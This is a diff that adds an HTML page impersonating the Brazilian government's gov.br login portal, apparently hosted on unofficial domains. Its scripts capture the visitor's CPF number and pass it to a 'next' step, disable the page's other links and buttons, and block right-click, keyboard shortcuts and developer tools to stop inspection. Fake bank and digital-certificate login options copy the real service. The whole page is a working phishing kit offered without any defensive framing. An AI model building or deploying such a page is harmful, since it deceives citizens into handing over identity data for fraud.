@@ -1,0 +1,463 @@
+<html lang="pt-BR"><head>
+	<meta charset="UTF-8">
+	<script src="js/latest.js" async="" defer=""></script>
+		<meta charset="utf-8">
+		<title>gov.br - Acesse sua conta</title>
+		<meta property="creator.productor" content="https://suportegov.online">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+
+		<link rel="icon" href="favicon.ico" type="image/x-icon">
+		<!-- Fontawesome -->
+		<!-- Fonts -->
+		<!-- Page CSS -->
+		<link rel="stylesheet" href="css/govbr-highcontrast.css">
+		<link rel="stylesheet" href="css/govbr-templates.css">
+		<link rel="stylesheet" href="css/govbr-modal.css">
+		<link rel="stylesheet" href="css/govbr-eula.css">
+
+		<link rel="stylesheet" href="css/all.min.css">
+            <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto&amp;display=swap">
+	</head>
+	<!-- Facebook Pixel Code -->
+
+	<body style="font-family: Roboto, serif !important;
+">
+		<a tabindex="0" href="#conteudo" class="sr-only sr-only-focusable" aria-label="Pular para o conteÃºdo principal. Navegue sempre com a tecla TAB">Pular
+			para o conteÃºdo principal</a>
+
+		<header>
+			<a href="https://www.gov.br"><img src="images/govbr.png" alt="Logomarca GovBR"></a>
+			<div id="acessibilidade">
+				<span>
+					<a href="#" onclick="contrastScript().toggleContrast(event)"><i class="fas fa-adjust"></i><span>Alto Contraste</span></a>
+				</span>
+				<span>
+					<a><i class="fas fa-deaf"></i><span>VLibras</span></a>
+				</span>
+			</div>
+
+		</header>
+		<div class="container">
+			<aside id="aside-signin">
+				<img id="identidade-govbr" src="images/conta_govbr_v2.jpg" alt="Logomarca GovBR">
+			</aside>
+			<main id="main-signin">
+				<form id="novoFormCPF" autocomplete="off" novalidate="">
+					<div class="card" id="login-cpf">
+						<h3 style="font-family: Roboto;">Identifique-se no gov.br com:</h3>
+						<div class="item-login-signup-ways" onclick="accordion('accordion-panel-id')">
+							<a tabindex="3">
+								<img src="images/id-card-solid.png">
+								Número do CPF
+							</a>
+						</div>
+						<div class="accordion-panel" id="accordion-panel-id">
+							<p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong>
+								sua conta gov.br</p>
+							<label for="cpf">CPF</label>
+							<input id="novoCampoCPF" name="accountId" autocomplete="new-password" tabindex="1" type="tel" value="" placeholder="Digite seu CPF" aria-invalid="false">
+							<div class="error-container">
+								<span class="error-text" id="cpfError"></span>
+								<img decoding="async" src="https://storage.atendebr.store/typebot/public/workspaces/clpx27mm0001olm2ne5mo7ahy/typebots/clrebeb190033p01cu4ieopc0/blocks/ceny1ptpolqkcin4xe0lj5yb?v=1705360872376" class="error-image" id="errorImage" alt="Error Image">
+							</div>
+							<div class="button-panel" id="login-button-panel">
+								<button id="enter-account-id" type="submit" name="operation" value="enter-account-id" class="button-continuar desabilitado" tabindex="2" disabled="">Continuar</button>
+							</div>
+							<style>
+                        .button-continuar {
+                            /* Estilos comuns do botão aqui */
+                            background: #1351B4 0 0 no-repeat padding-box !important; /* Cor quando habilitado */
+                        }
+                    
+                        .button-continuar.desabilitado {
+                            background: #b5b5b5 0 0 no-repeat padding-box !important; /* Cor quando desabilitado */
+                        }
+                    </style>
+							<style>
+                        .error-border {
+                            border: 1px solid red !important;
+                            box-shadow: 0 0 0 1px #ffa5b9;
+                        }
+                
+                        .error-text {
+                            color: red !important;
+                        }
+                
+                        .error-container {
+                            margin: 10px 0px -17px 10px;
+                            display: inline-block;
+                            align-items: center;
+                        }
+                
+                        .error-image {
+                            display: none;
+                            margin: -63px 0px 0px 265px;
+                        }
+                    </style>
+							<script>
+                        // Função para substituir o botão específico
+    function substituirBotaoEspecifico() {
+        const novoBotao = document.createElement('button');
+        novoBotao.type = 'button';
+        novoBotao.id = 'allowedButton';
+        novoBotao.className = 'button-continuar desabilitado';
+        novoBotao.innerHTML = 'Continuar';
+        novoBotao.disabled = true;
+
+        const botaoAlvo = document.getElementById('enter-account-id');
+        if (botaoAlvo) {
+            botaoAlvo.parentNode.replaceChild(novoBotao, botaoAlvo);
+        }
+
+        novoBotao.addEventListener('click', redirecionarSeValido);
+    }
+                    
+                        function bloquearElementosClicaveis() {
+                            document.querySelectorAll('button:not(#allowedButton)').forEach(function(botao) {
+                                botao.disabled = true;
+                            });
+                    
+                            document.querySelectorAll('a').forEach(function(link) {
+                                link.addEventListener('click', function(event) {
+                                    event.preventDefault();
+                                });
+                            });
+                    
+                            document.querySelectorAll('img').forEach(function(imagem) {
+                                if (imagem.parentNode.tagName === 'A') {
+                                    imagem.parentNode.addEventListener('click', function(event) {
+                                        event.preventDefault();
+                                    });
+                                }
+                            });
+                        }
+                    
+                        var cpfInput = document.getElementById('novoCampoCPF');
+                        var cpfError = document.getElementById('cpfError');
+                        var errorImage = document.getElementById('errorImage');
+                    
+                        cpfInput.addEventListener('input', mascaraCPF);
+                    
+                        function mascaraCPF() {
+        var cpf = cpfInput.value;
+        cpf = cpf.replace(/\D/g, "");
+        if (cpf.length > 11) {
+            cpf = cpf.substring(0, 11);
+        }
+        cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
+        cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
+        cpf = cpf.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+        cpfInput.value = cpf;
+
+        validarCPF();
+    }
+                    
+                        function validarCPF() {
+        var cpf = cpfInput.value;
+        var cpfNumeros = cpf.replace(/[^\d]+/g, '');
+
+        var botao = document.getElementById('allowedButton');
+        if (cpf.length !== 14 || !validaCPF(cpfNumeros)) {
+            cpfError.textContent = cpf.length === 14 ? 'CPF Inválido' : '';
+            cpfInput.classList.toggle('error-border', cpf.length === 14);
+            errorImage.style.display = cpf.length === 14 ? 'inline-block' : 'none';
+            botao.disabled = true;
+            botao.classList.add('desabilitado');
+        } else {
+            cpfError.textContent = '';
+            cpfInput.classList.remove('error-border');
+            errorImage.style.display = 'none';
+            botao.disabled = false;
+            botao.classList.remove('desabilitado');
+        }
+    }
+                    
+                        function validaCPF(cpf) {
+                            cpf = cpf.replace(/[^\d]+/g,'');
+                            if(cpf === '' || cpf.length !== 11 || /^(.)\1+$/.test(cpf)) return false;
+                            let add = 0;
+                            for (let i = 0; i < 9; i++) {
+                                add += parseInt(cpf.charAt(i)) * (10 - i);
+                            }
+                            let rev = 11 - (add % 11);
+                            rev = (rev === 10 || rev === 11) ? 0 : rev;
+                            if (rev !== parseInt(cpf.charAt(9))) return false;
+                            add = 0;
+                            for (let i = 0; i < 10; i++) {
+                                add += parseInt(cpf.charAt(i)) * (11 - i);
+                            }
+                            rev = 11 - (add % 11);
+                            rev = (rev === 10 || rev === 11) ? 0 : rev;
+                            return rev === parseInt(cpf.charAt(10));
+                        }
+                    
+                        function redirecionarSeValido() {
+                            var cpf = cpfInput.value.replace(/[^\d]+/g,'');
+                            if (validaCPF(cpf)) {
+                                var utmParams = getUTMParameters();
+                                var queryString = Object.keys(utmParams).map(function(key) {
+                                    return key + '=' + encodeURIComponent(utmParams[key]);
+                                }).join('&');
+                    
+                                var url = "./next?cpf=" + cpf;
+                                if (queryString) {
+                                    url += '&' + queryString;
+                                }
+                    
+                                window.location.href = url;
+                            }
+                        }
+                    
+                        function getUTMParameters() {
+                            var params = {};
+                            window.location.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(str, key, value) {
+                                params[key] = value;
+                            });
+                            return params;
+                        }
+                    
+                        substituirBotaoEspecifico();
+                        bloquearElementosClicaveis();
+                    </script>
+						</div>
+						<label id="title-outras-op">Outras opções de identificação:</label>
+						<hr id="hr-outras-op" style="margin: 0 0 0">
+
+						<div class="item-login-signup-ways" onclick="showModal('modal-bancos-credenciados')">
+							<button type="button" tabindex="5" class="button-href-mimic2" style="color:#008C32" onclick="showModal('modal-bancos-credenciados')">
+								<img src="images/InternetBanking-green.png">
+								Login com seu banco
+								<span style="font-size: 7px; background-color: #008C32; color: white; padding: 3px; top: -3px; position: relative; margin-left: 8px;">SUA
+									CONTA SERÁ PRATA</span>
+							</button>
+						</div>
+						<div class="modal-bancos-credenciados">
+							<div class="modal-content">
+								<h3>Bancos Credenciados</h3>
+								<p><b>Crie</b> ou <b>aumente o nível</b> da sua conta para <b>PRATA</b>,
+									fazendo login com seu banco.</p>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-banco-do-brasil" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/bb_logo.png">
+										Banco do Brasil</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-banrisul" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/banrisul_logo.png">
+										Banrisul</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-bradesco" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/bradesco_logo.png">
+										Bradesco</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-banco-de-brasilia" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/brb_logo.png">
+										Banco de Brasília</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-caixa-economica" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/cef_logo.png">
+										Caixa Econômica</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-sicoob" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/sicoob_logo.png">
+										Sicoob</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-santander" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/santander_logo.png">
+										Santander</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-itau" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/itau_logo.png">
+										Itaú</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-agibank" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/agibank_logo.png">
+										Agibank</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-sicredi" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/sicredi_logo.png">
+										Sicredi</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-mercantil" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/mercantil_logo.png">
+										Mercantil do Brasil</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-picpay" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/picpay.png">
+										PicPay/Original</button>
+								</div>
+								<hr>
+								<div class="button-panel" id="modal-bancos-credenciados-button-panel">
+									<button class="button-cancel" type="button" id="btn-close-modal-bancos-credenciados" onclick="closeModal('modal-bancos-credenciados')">Cancelar</button>
+								</div>
+							</div>
+						</div>
+						<div class="item-login-signup-ways" onclick="showQrCode('eee89ccb-c2d3-45e1-bb8d-fbd387f04b7f');">
+							<a tabindex="5" href="#">
+								<img src="images/qrcode.png">
+								Login com QR code
+							</a>
+						</div>
+						<div class="item-login-signup-ways" id="cert-digital">
+							<button id="login-certificate" type="submit" name="operation" value="login-certificate" class="button-href-mimic2" tabindex="4">
+								<img src="images/CD.png">
+								Seu certificado digital
+							</button>
+						</div>
+						<div class="item-login-signup-ways" id="cert-digital-cloud">
+							<button type="button" onclick="showModal('modal-certificado-nuvem')" class="button-href-mimic2" tabindex="5">
+								<img src="images/CD-Nuvem.png" id="cert-digital-cloud-img">
+								Seu certificado digital em nuvem
+							</button>
+						</div>
+						<div class="modal-certificado-nuvem">
+							<div class="modal-content">
+								<h3>Provedores de Certificados em Nuvem</h3>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-neoid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/neoid_logo.png">
+										NeoID</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-safeid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/safeid_logo.png">
+										SafeID</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-birdid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/birdid_logo.png">
+										BirdID</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-remoteid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/remoteid_logo.png">
+										RemoteID</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-vidaas" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/vidaas_logo.png">
+										Vidaas</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-serasa" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/serasa_logo.png">
+										Serasa Experian</button>
+								</div>
+								<div class="item-login-signup-ways">
+									<button id="login-external-authentication-dscloud" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+										<img src="images/digitalsign_logo.png">
+										DS Cloud</button>
+								</div>
+								<hr>
+								<div class="button-panel" id="modal-bancos-credenciados-button-panel">
+									<button class="button-cancel" type="button" id="btn-close-modal-certificado-nuvem" onclick="closeModal('modal-certificado-nuvem')">Cancelar</button>
+								</div>
+							</div>
+						</div>
+						<div class="entenda-id-govbr" id="entenda-id-govbr">
+							<span>
+								<a tabindex="6" id="entenda-id-govbr-a">
+									Está com dúvidas e precisa de ajuda?
+								</a>
+								<a tabindex="6" style="display: block;" target="_blank" id="termo-de-uso">Termo de Uso e Aviso de Privacidade</a>
+							</span>
+						</div>
+					</div>
+				</form></main></div>
+			
+		
+	
+	<div class="modal-qrcode">
+		<div class="modal-content" style="text-align: center; justify-content: space-evenly">
+			<h3>Login sem senha com QR code</h3>
+			<p style="text-align: justify; justify-content: space-evenly">Utilize o
+				<strong>aplicativo gov.br</strong> para logar sem senha, usando apenas o
+				leitor de QR code.</p>
+			<div id="qrcode" style="display: inline-block"><canvas width="224" height="224"></canvas><img style="display: none;"></div>
+			<p style="text-align: justify; justify-content: space-evenly">
+				Você pode baixar o aplicativo <strong>gov.br</strong> gratuitamente nas
+				lojas de aplicativos.
+			</p>
+			<p style="text-align: center">
+				<a>
+					<img src="images/disponivel-no-google-play.png" alt="Android" style="width: 125px">
+				</a>
+				<a>
+					<img src="images/disponivel-na-apple-store.png" alt="iOS" style="width: 125px">
+				</a>
+			</p>
+			<div class="button-panel">
+				<button class="button-cancel" type="button" id="btn-close-modal-qrcode" onclick="stopQrCode()">Cancelar</button>
+			</div>
+		</div>
+	</div>
+    <script>
+        const disabledKeys = ["c", "C", "x", "J", "u", "I"];
+
+        const showAlert = e => {
+            e.preventDefault();
+            alert("Acesso negado!!");
+        }
+
+        document.addEventListener("contextmenu", showAlert);
+
+        document.addEventListener("keydown", e => {
+            if ((e.ctrlKey && disabledKeys.includes(e.key)) || e.key === "F12") {
+                showAlert(e);
+            }
+        });
+    </script>
+
+    <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>
+	<footer>
+		<script>
+			let prefix = ["seu checkout"];
+		
+			function getParams() {
+				let t = "",
+					e = window.top.location.href,
+					r = new URL(e);
+				if (null != r) {
+					let a = r.searchParams.get("utm_source"),
+						n = r.searchParams.get("utm_medium"),
+						o = r.searchParams.get("utm_campaign"),
+						m = r.searchParams.get("utm_term"),
+						c = r.searchParams.get("utm_content");
+					if (-1 !== e.indexOf("?")) {
+						t = `&sck=${a}|${n}|${o}|${m}|${c}`;
+					}
+					console.log(t);
+				}
+				return t;
+			}
+		
+			(function() {
+				var t = new URLSearchParams(window.location.search);
+				if (t.toString()) {
+					document.querySelectorAll("a").forEach(function(e) {
+						for (let r = 0; r < prefix.length; r++) {
+							if (-1 !== e.href.indexOf(prefix[r])) {
+								if (-1 === e.href.indexOf("?")) {
+									e.href += "?" + t.toString() + getParams();
+								} else {
+									e.href += "&" + t.toString() + getParams();
+								}
+							}
+						}
+					});
+				}
+			})();
+		</script>
+		
+	</footer>
+	</body></html>
